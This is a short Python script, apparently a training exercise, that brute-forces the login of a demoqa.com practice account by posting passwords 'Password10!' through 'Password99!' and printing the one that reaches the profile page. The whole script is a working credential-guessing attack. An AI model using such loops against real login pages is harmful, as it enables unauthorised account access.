import requests

url = "https://demoqa.com/login"

for i in range(10, 100):
    payload = {
        "userName": "masterschool",
        "password": f"Password{i}!"
    }

    response = requests.post(url, data=payload)

    if response.url == "https://demoqa.com/profile":
        print(f"Password{i}!")
        break
